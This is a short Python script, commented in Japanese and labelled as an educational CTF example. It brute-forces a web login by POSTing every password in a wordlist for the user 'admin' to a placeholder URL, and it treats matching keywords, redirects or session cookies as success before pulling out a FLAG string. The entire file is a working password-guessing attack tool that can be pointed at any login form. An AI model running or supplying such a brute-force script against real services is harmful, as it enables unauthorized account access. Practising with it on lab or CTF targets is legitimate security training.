"""
CTF Login Challenge - Educational Example
・架空のCTFログインページを想定
・成功条件をレスポンスから判定
・requests を使った最小構成
"""

import re
import requests

# ===== 設定 =====
TARGET_URL = "http://ctf.example/login"   # 架空URL
USERNAME = "admin"
WORDLIST_PATH = "passwords.txt"
TIMEOUT = 5

SUCCESS_KEYWORDS = [
    "Welcome",
    "Login Success",
    "FLAG{"
]

# ===== ユーティリティ =====
def load_passwords(path):
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]

def send_login(url, username, password):
    payload = {
        "username": username,
        "password": password
    }
    # allow_redirects=True で遷移も含めて確認
    return requests.post(url, data=payload, timeout=TIMEOUT, allow_redirects=True)

def is_login_success(response):
    # パターン1: FLAGが含まれる
    if "FLAG{" in response.text:
        return True

    # パターン2: 成功キーワード
    for kw in SUCCESS_KEYWORDS:
        if kw in response.text:
            return True

    # パターン3: ステータスコードや最終URL
    if response.status_code in (301, 302):
        return True

    # パターン4: セッションCookie
    if response.cookies:
        return True

    return False

def extract_flag(response):
    match = re.search(r"FLAG\{.*?\}", response.text)
    return match.group(0) if match else None

# ===== メイン処理 =====
def main():
    passwords = load_passwords(WORDLIST_PATH)
    print("[*] Start CTF Login Challenge")
    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] Username: {USERNAME}")
    print(f"[*] Passwords loaded: {len(passwords)}")

    for idx, password in enumerate(passwords, 1):
        print(f"[{idx}] Try password: {password}")

        try:
            response = send_login(TARGET_URL, USERNAME, password)
        except requests.RequestException as e:
            print(f"    [!] Network error: {e}")
            continue

        if is_login_success(response):
            print("\n[+] SUCCESS!")
            print(f"[+] Password found: {password}")

            flag = extract_flag(response)
            if flag:
                print(f"[+] FLAG: {flag}")
            else:
                print("[+] FLAG not directly found (check response manually)")

            break
        else:
            print("    [-] Failed")

    else:
        print("\n[-] Password not found")

    print("[*] Done")

# ===== 実行 =====
if __name__ == "__main__":
    main()
